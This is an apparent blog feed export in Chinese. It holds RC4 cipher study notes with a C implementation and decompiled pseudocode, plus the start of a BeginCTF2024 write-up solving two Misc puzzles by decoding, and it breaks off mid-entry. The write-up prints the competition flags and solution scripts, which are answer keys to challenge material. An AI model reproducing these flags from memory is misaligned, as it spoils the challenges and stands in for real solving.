        <content type="html"><![CDATA[<h1 id="rc4加密算法学习"><a class="markdownIt-Anchor" href="#rc4加密算法学习"></a> RC4加密算法学习</h1><h2 id="算法分析"><a class="markdownIt-Anchor" href="#算法分析"></a> 算法分析</h2><h3 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h3><p>RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 ----wiki <a href="https://zh.wikipedia.org/zh-hans/RC4">https://zh.wikipedia.org/zh-hans/RC4</a></p><h3 id="加密解密原理"><a class="markdownIt-Anchor" href="#加密解密原理"></a> 加密(解密)原理</h3><p>RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。</p><p>由于异或运算的对合性，RC4加密解密使用同一套算法</p><p>下面用C语言实现:</p><p>首先看加密过程的几个基本变量</p><ol><li>S-Box就是S盒，是一个256长度的char型数组，每个单元都是一个字节，算法运行的任何时候，S都包括0-255的8比特数的排列组合，只不过值的位置发生了变换</li><li>密钥K char key[256] 密钥的长度keylen与明文长度，密钥流的长度没有必然关系</li><li>临时向量k，长度也为256，每个单元也是一个字节。如何密钥的长度是256字节，就直接把密钥的值赋给k，否则，轮转地将每个字节赋给k</li></ol><p>(1)初始化:</p><p>包含三个参数</p><p>参数1是一个256长度的char型数组，定义为:unsigned char sBox[256];</p><p>参数2是密钥，其内容可以随便定义: char key[256]；</p><p>参数3是密钥长度，Len=strlen(key);</p><p>初始化长度为256的S盒。第一个for循环将0到255的互不重复的元素装入S盒。第二个for循环根据密钥打乱S盒。</p><p>i确保S-box的每个元素都得到处理，j保证S-box的搅乱是随机的</p><p>790</p><p>847</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">rc4_init</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> Len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> k<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>        k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span>Len<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//把key循环赋给k[]里</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//打乱SBox,只是其中的元素进行了随机交换</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        j<span class="token operator">=</span><span class="token punctuation">(</span>j<span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span> <span class="token comment">//!这是一个伪随机数</span>        tmp<span class="token operator">=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(2)加解密</p><p>包含三个参数</p><p>参数1是上边rc4_init函数中被搅乱的S-box</p><p>参数2是需要加密的数据data</p><p>参数3是data的长度</p><p>每收到一个字节，就进行while循环，通过一定的算法定位S盒中的一个元素，并与输入字节异或，得到k。循环中还改变了S盒。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。</p><p>5740</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">rc4_crypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>Data<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> Len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp<span class="token punctuation">;</span>    <span class="token comment">//实际上就是Data的每个字节与Sbox的一个伪随机位置进行字节异或，进行一次还改变S盒子</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>Len<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">//通过一定算法生成伪随机数,再打乱S-box</span>        i<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>        j<span class="token operator">=</span><span class="token punctuation">(</span>j<span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>        tmp<span class="token operator">=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//交换s[x]和s[y]</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>tmp<span class="token punctuation">;</span>        <span class="token comment">//再生成一个随机位置，对明文进行异或</span>        t<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>        Data<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token operator">^=</span>s<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(3)主函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>s2<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> key<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"HelloWorld"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> pData<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"HelloWorld"</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> len<span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pData=%s\n"</span><span class="token punctuation">,</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"key=%s,length=%d\n\n"</span><span class="token punctuation">,</span>key<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">rc4_init</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>key<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"完成对S[i]的初始化，如下:\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//输出S[i]</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02X"</span><span class="token punctuation">,</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">16</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//用s2[i]暂时保存初始化过的s[i],用来解密</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"已经初始化，现在加密:\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pData<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pData=%s\n\n"</span><span class="token punctuation">,</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"已经加密，现在解密:\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">rc4_crypt</span><span class="token punctuation">(</span>s2<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pData<span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pData=%s\n\n"</span><span class="token punctuation">,</span>pData<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果</p><pre class="line-numbers language-none"><code class="language-none">pData&#x3D;HelloWorldkey&#x3D;HelloWorld,length&#x3D;10完成对S[i]的初始化，如下:32121C207C79CFAFBC29D5BE2DDC162C3E1A97663F8C98915115C199638DE9688B226C4D43C557E208C056ED190C544010460B839BC4ABC9CE49EF7414B40D014C0EA082FAA31D23424B531FE7049DD662D2EE319FDA73EB7A703BEC59DFB90777F2BD02D9457536275E41A4901E6D7DE4373A06872F47EA5D816588FECAB70FAD5F4ADBCBA16ABABFD348508F177EB29592B12BA2615C3C869EE03864B8DD580596C2FFA70334D8C37FB5256F94AE0071B03576BBF769215B288E553DE326A8DEF6D7670A934E13F1E8306E72FBCD1B89AAE17BD1D0B6809A44FDACA539F4F52EE6C65A852A094FD4F3788A60F833F0F9B39CA918E56BFCC7CC84241152A6C8已经初始化，现在加密:pData&#x3D;7��K�l��已经加密，现在解密:pData&#x3D;HelloWorld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="逆向分析"><a class="markdownIt-Anchor" href="#逆向分析"></a> 逆向分析</h2><p>20215</p><p>rc4共有两个函数 sub_E41000,sub_E410E0<br />下面来具体分析这两个函数，具体解释都放在图里了，看图即可</p><h4 id="sub_e41000初始化"><a class="markdownIt-Anchor" href="#sub_e41000初始化"></a> sub_E41000初始化</h4><p>函数头如下，三个值<br /><code>sub_E41000(&amp;v6, &amp;v10, strlen(&amp;v10));</code><br />对应上面源码<br /><code>void rc4_init(unsigned char *s,unsigned char *key, unsigned long Len)</code></p><p>伪代码</p><p>20488</p><h4 id="sub_e410e0-加密"><a class="markdownIt-Anchor" href="#sub_e410e0-加密"></a> sub_E410E0 加密</h4><p>sub_E410E0(&amp;v6, v3, strlen(v3));</p><p>对应上面的源码:</p><p>void rc4_crypt(unsigned char *s,unsigned char *Data,unsigned long Len)</p><p>伪代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __usercall sub_E410E0@<span class="token operator">&lt;</span>eax<span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">int</span> result@<span class="token operator">&lt;</span>eax<span class="token operator">></span><span class="token punctuation">,</span> <span class="token keyword">int</span> a2<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// ecx</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// esi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// edi</span>  <span class="token keyword">unsigned</span> __int8 v6<span class="token punctuation">;</span> <span class="token comment">// dl</span>  v3 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a3 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      v3 <span class="token operator">=</span> <span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>      v6 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>      v4 <span class="token operator">=</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> result<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> result<span class="token punctuation">)</span> <span class="token operator">=</span> v6<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>v5<span class="token operator">++</span> <span class="token operator">+</span> a2<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//   Data[k]^=s[t];</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;</span> a3 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="魔改rc4"><a class="markdownIt-Anchor" href="#魔改rc4"></a> 魔改RC4</h3><p>RC4内部取随机数的算法可以进行魔改，关键要识别特征，逆向算法或者根据直接拿密文用原加密程序直接异或出明文</p><p>常见变化位置</p><ol><li>密钥经过上一步的其他加密后传入</li><li>s盒内部数据固定</li><li>rc4加密后数据进行重加密</li></ol><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>识别特征，内部多次限制256次循环，mod256,以及读取数据strlen的特点</p><p>参考网址：<br /><a href="https://zh.wikipedia.org/zh-hans/RC4">https://zh.wikipedia.org/zh-hans/RC4</a><br /><a href="https://zh.wikipedia.org/wiki/S%E7%9B%92">https://zh.wikipedia.org/wiki/S%E7%9B%92</a><br /><a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/special/rc4/">https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/special/rc4/</a></p><p><a href="https://www.52pojie.cn/thread-800115-1-1.html">https://www.52pojie.cn/thread-800115-1-1.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTF2024个人Wp</title>
      <link href="/2024/02/07/BeginCTF2024%E4%B8%AA%E4%BA%BAWp/"/>
      <url>/2024/02/07/BeginCTF2024%E4%B8%AA%E4%BA%BAWp/</url>
      
        <content type="html"><![CDATA[<p>last updated-2.24</p><p>参考链接:</p><p><a href="https://hjug69b9j6.feishu.cn/docx/V02Rd3MyWoRPVxxTTCOcLutNnqe">BeginCTF官方WP - 飞书云文档 (feishu.cn)</a></p><p><a href="https://hw6vk9v66q.feishu.cn/docx/UIm5dwwbzo4O6IxALeZcpXdCnDh">BeginCTF 2023 Reverse 题目附件 - 飞书云文档 (feishu.cn)</a></p><p><a href="https://blog.csdn.net/Pisces50002/article/details/136073163?spm=1001.2014.3001.5502">BeginCTF2024 RE WP 部分复现-CSDN博客</a></p><p>Reverse目前未复现:ezvm,babyvm,真龙之力</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> <strong>Misc</strong></h1><h2 id="real-check-in"><a class="markdownIt-Anchor" href="#real-check-in"></a> <strong>real check in</strong></h2><pre class="line-numbers language-Plain" data-language="Plain"><code class="language-Plain">为了选手有更好的游玩体验请及时加入beginctf2024官方群,群号:612995005从catf1y的笔记本中发现了这个神秘的代码MJSWO2LOPNLUKTCDJ5GWKX3UN5PUEM2HNFXEGVCGL4ZDAMRUL5EDAUDFL5MU6VK7O5UUYMK7GEYWWZK7NE3X2&#x3D;&#x3D;&#x3D;你能帮助我找到最后的flag吗?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>直接basecrack一波得到</p><pre class="line-numbers language-none"><code class="language-none">begin&#123;WELCOMe_to_B3GinCTF_2024_H0Pe_YOU_wiL1_11ke_i7&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="devils-word"><a class="markdownIt-Anchor" href="#devils-word"></a> <strong>devil’s word</strong></h2><pre class="line-numbers language-none"><code class="language-none">leu lia leu ng leu cai leu jau leu e cai b cai jau sa leng cai ng ng f leu b leu e sa leng cai cai ng f cai cai sa sa leu e cai a leu bo leu f cai ng ng f leu sii leu jau sa sii leu c leu ng leu sa cai sii cai d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我当时的思路看到了有15个字符，且出现了a b c d e f 盲猜是16进制，只要推断出leng lia sa sii ng leu ai bo jau 代表的数字，然后两两一组 根据flag格式是begin{}</p><p>1696</p><p>没推出来的就要爆破了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> <span class="token punctuation">(</span>ii<span class="token punctuation">,</span>jj<span class="token punctuation">,</span>kk<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    replace_dict<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'lia'</span><span class="token punctuation">:</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'leng'</span><span class="token punctuation">:</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'cai'</span><span class="token punctuation">:</span><span class="token string">'7'</span><span class="token punctuation">,</span>              <span class="token string">'jau'</span><span class="token punctuation">:</span><span class="token string">'9'</span><span class="token punctuation">,</span>              <span class="token string">'au'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ii<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>              <span class="token string">'sii'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jj<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>              <span class="token string">'leu'</span><span class="token punctuation">:</span><span class="token string">'6'</span><span class="token punctuation">,</span>              <span class="token string">'bo'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>kk<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>              <span class="token string">'sa'</span><span class="token punctuation">:</span><span class="token string">'3'</span><span class="token punctuation">,</span>              <span class="token string">'ng'</span><span class="token punctuation">:</span><span class="token string">'5'</span>            <span class="token punctuation">&#125;</span>    newlist<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> mylist<span class="token punctuation">:</span>        <span class="token keyword">for</span> key<span class="token punctuation">,</span>value <span class="token keyword">in</span> replace_dict<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            x<span class="token operator">=</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>key<span class="token punctuation">,</span>value<span class="token punctuation">)</span>        newlist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    list2<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>newlist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>newlist<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>newlist<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    list3<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> it <span class="token keyword">in</span> list2<span class="token punctuation">:</span>        list3<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>it<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后一个一个试出来</p><pre class="line-numbers language-none"><code class="language-none">begin&#123;y0u_kn0w_w3nzhou_di4lect&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>事实上预期解法是这样的</p><p>魔鬼的语言是一个梗，指的是温州话。</p><p>密文中除了i是单个字母外，其他单个字母都是a-f，说明可能是十六进制。</p><p>那么这些奇奇怪怪的单词应该是温州话数字的读音。</p><p>去搜索温州话读音就能知道那些语言代表什么,还是要提高自己的信息搜索能力</p><h2 id="你知道中国文化嘛"><a class="markdownIt-Anchor" href="#你知道中国文化嘛"></a> <strong>你知道中国文化嘛</strong></h2><pre class="line-numbers language-none"><code 